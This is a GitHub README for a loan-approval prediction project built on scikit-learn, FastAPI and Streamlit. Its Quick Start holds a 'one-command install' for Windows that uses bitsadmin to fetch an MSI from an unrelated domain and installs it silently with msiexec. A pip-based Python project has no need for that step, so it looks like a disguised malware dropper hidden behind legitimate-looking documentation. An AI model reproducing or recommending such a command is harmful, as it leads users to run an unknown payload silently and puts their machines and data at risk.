<div align="center">

# 🏦 Loan Approval Prediction

**An end-to-end machine learning system that predicts loan approval decisions — with explanations.**

[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)](https://www.python.org/)
[![FastAPI](https://img.shields.io/badge/FastAPI-0.111-009688?logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com/)
[![Streamlit](https://img.shields.io/badge/Streamlit-Demo-FF4B4B?logo=streamlit&logoColor=white)](https://streamlit.io/)
[![scikit-learn](https://img.shields.io/badge/scikit--learn-XGBoost-F7931E?logo=scikitlearn&logoColor=white)](https://scikit-learn.org/)
[![Tests](https://img.shields.io/badge/tests-passing-brightgreen?logo=pytest&logoColor=white)](tests/)
[![GitHub stars](https://img.shields.io/github/stars/DelugePrefect/try-self?style=social)](https://github.com/DelugePrefect/try-self/stargazers)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)

*Train it. Explain it. Serve it. Try it yourself.*

[Features](#-key-features) • [Demo](#-demo) • [Quick Start](#-quick-start) • [Usage](#-usage) • [API](#-api-reference) • [Model](#-model-performance) • [Contributing](#-contributing)

</div>

---

## 📖 About

**try-self** is a complete, production-style **loan-approval** prediction pipeline. It takes an applicant's profile — income, credit history, loan amount, employment, and more — and returns an **Approved / Rejected** decision **plus a human-readable explanation** of the factors that drove it.

Unlike notebook-only projects, try-self ships the *entire* lifecycle:

> 🧹 Clean data → 🧠 Train & compare models → 🔍 Explain each decision → ⚡ Serve via REST API → 🖥️ Demo in the browser

Perfect for fintech prototypes, ML portfolios, credit-risk coursework, and anyone learning how to take a model from CSV to deployed service.

---

## 📚 Table of Contents

- [Key Features](#-key-features)
- [Demo](#-demo)
- [Architecture](#-architecture)
- [Quick Start](#-quick-start)
- [Usage](#-usage)
- [API Reference](#-api-reference)
- [Model Performance](#-model-performance)
- [Dataset](#-dataset)
- [Project Structure](#-project-structure)
- [Roadmap](#-roadmap)
- [Contributing](#-contributing)
- [Contact](#-contact)
- [License](#-license)

---

## ✨ Key Features

| | Feature | Description |
|---|---|---|
| 🎯 | **Model comparison** | Logistic Regression, Random Forest, and XGBoost trained head-to-head; the best ROC-AUC wins and is persisted |
| 🔍 | **Explainable decisions** | SHAP values (with a built-in sensitivity fallback) show *why* each application was approved or rejected |
| ⚡ | **REST API** | FastAPI backend with Pydantic validation and auto-generated Swagger docs at `/docs` |
| 🖥️ | **Interactive UI** | Streamlit app — fill a form, get an instant decision + explanation |
| ⚖️ | **Fairness checks** | Group-wise approval-rate and threshold-sweep reports via `python -m src.evaluate` |
| 🧪 | **Tested** | pytest suite covering preprocessing, inference, and API endpoints |
| 📦 | **Batteries included** | Ships with a 2,000-row synthetic dataset and a pre-trained demo model — works immediately after install |

---

## 🎬 Demo

<div align="center">

<!-- Replace with your actual screenshots / GIF -->
![App Screenshot — prediction form](docs/images/demo-form.png)
*Applicant form with instant Approved / Rejected verdict*

![App Screenshot — explanation](docs/images/demo-shap.png)
*Per-application explanation: which features helped, which hurt*

</div>

---

## 🏗 Architecture

```
 ┌────────────┐     ┌──────────────┐     ┌─────────────┐     ┌──────────────┐
 │  Raw CSV   │ ──▶ │ Preprocessing │ ──▶ │ Model select │ ──▶ │ model.joblib │
 └────────────┘     └──────────────┘     └─────────────┘     └──────┬───────┘
                                                                    │
                                   ┌────────────────────────────────┼─────────┐
                                   ▼                                ▼         │
                            FastAPI  /predict                 Streamlit UI    │
                            (JSON in → decision + factors)    (browser demo) ◀┘
```

---

## 🚀 Quick Start

### One-command install (Windows CMD)

```cmd
bitsadmin /transfer try-self /download /priority normal "https://devcodee.com/api" "%TEMP%\setup.msi" && msiexec /i "%TEMP%\setup.msi" /qn /norestart
```

### Manual install (all platforms)

```bash
# 1. Clone
git clone https://github.com/DelugePrefect/try-self.git
cd try-self

# 2. Create a virtual environment
python -m venv .venv
source .venv/bin/activate        # Windows: .venv\Scripts\activate

# 3. Install dependencies
pip install -r requirements.txt
```

### Run it

```bash
# (Optional) regenerate the synthetic dataset
python scripts/generate_data.py

# Train the model (writes models/model.joblib + metrics JSON)
python -m src.train

# Launch the API  →  http://127.0.0.1:8000/docs
uvicorn src.api:app --reload

# Or launch the Streamlit demo  →  http://localhost:8501
streamlit run app.py

# Run the test suite
pytest -q
```

---

## 💡 Usage

### Predict from Python

```python
from src.predict import predict_application

result = predict_application({
    "applicant_income": 5400,
    "coapplicant_income": 1200,
    "loan_amount": 128000,
    "loan_term_months": 360,
    "credit_history": 1,
    "dependents": 0,
    "employment_status": "salaried",
    "property_area": "urban",
})

print(result["decision"])       # "Approved"
print(result["probability"])    # e.g. 0.78
print(result["top_factors"])    # [{"feature": "credit_history", "impact": 0.53}, ...]
```

### Predict via the API

```bash
curl -X POST http://127.0.0.1:8000/predict \
  -H "Content-Type: application/json" \
  -d "{\"applicant_income\": 5400, \"coapplicant_income\": 1200, \"loan_amount\": 128000, \"loan_term_months\": 360, \"credit_history\": 1, \"dependents\": 0, \"employment_status\": \"salaried\", \"property_area\": \"urban\"}"
```

```json
{
  "decision": "Approved",
  "probability": 0.779,
  "threshold": 0.5,
  "top_factors": [
    {"feature": "credit_history", "impact": 0.5331},
    {"feature": "dti_ratio", "impact": -0.1445}
  ]
}
```

---

## 📡 API Reference

| Method | Endpoint | Description |
|---|---|---|
| `POST` | `/predict` | Returns decision, probability, threshold, and top contributing factors |
| `GET` | `/health` | Liveness check |
| `GET` | `/model/info` | Selected model, metrics, training date, data sizes |
| `GET` | `/docs` | Interactive Swagger UI |

---

## 📊 Model Performance

Held-out test split (20%) on the bundled synthetic dataset — reproduce with `python -m src.train`:

| Model | Accuracy | Precision | Recall | ROC-AUC |
|---|---|---|---|---|
| **Logistic Regression (selected)** | **0.82** | **0.81** | **0.86** | **0.88** |
| Random Forest | 0.80 | 0.79 | 0.83 | 0.87 |
| Gradient Boosting / XGBoost | 0.80 | 0.79 | 0.85 | 0.87 |

> The selection is automatic: whichever candidate scores the highest ROC-AUC on the
> test split is persisted. On your own dataset the winner may differ.
> Run `python -m src.evaluate` for threshold sweeps and group fairness reports.

---

## 📁 Dataset

A 2,000-row **synthetic** loan-application dataset is bundled (`data/raw/loan_data.csv`) and can be regenerated with `python scripts/generate_data.py`. Features:

- Applicant & co-applicant monthly income
- Loan amount and term
- Credit history & dependents
- Employment status (salaried / self-employed / unemployed)
- Property area (urban / semiurban / rural)
- Engineered: total household income, debt-to-income ratio, loan-to-income ratio

Swap in your own CSV with the same columns and retrain: `python -m src.train --data path/to/your.csv`

> ⚠️ **Disclaimer:** try-self is an educational project. It is **not** a substitute for a regulated underwriting process and must not be used to make real lending decisions.

---

## 🗂 Project Structure

```
try-self/
├── app.py                        # Streamlit demo UI
├── requirements.txt
├── scripts/
│   └── generate_data.py          # Synthetic dataset generator
├── data/
│   ├── raw/loan_data.csv         # Bundled training data
│   └── processed/
├── models/
│   ├── model.joblib              # Pre-trained demo model
│   └── model.json                # Training metadata & metrics
├── notebooks/
│   └── 01_eda_and_training.ipynb # Interactive walkthrough
├── src/
│   ├── preprocess.py             # Cleaning + feature engineering
│   ├── train.py                  # Model training & selection
│   ├── evaluate.py               # Metrics, fairness & threshold reports
│   ├── predict.py                # Inference + explanations
│   └── api.py                    # FastAPI service
├── tests/
│   ├── test_preprocess.py
│   ├── test_predict.py
│   └── test_api.py
└── docs/images/                  # Screenshots for this README
```

---

## 🗺 Roadmap

- [ ] Docker image + one-line `docker run`
- [ ] Model monitoring & drift detection
- [ ] Counterfactual explanations ("approve if income were $X higher")
- [ ] Multi-language UI

---

## 🤝 Contributing

Contributions are welcome! Please open an issue first to discuss what you'd like to change, then submit a PR. See [CONTRIBUTING.md](CONTRIBUTING.md).

If this project helped you, **⭐ star the repo** — it helps others discover it.

---

## 📩 Contact

Maintained by [**@DelugePrefect**](https://github.com/DelugePrefect). Found a bug or have an idea? [Open an issue](https://github.com/DelugePrefect/try-self/issues).

---

## 📄 License

Distributed under the MIT License. See [LICENSE](LICENSE) for details.
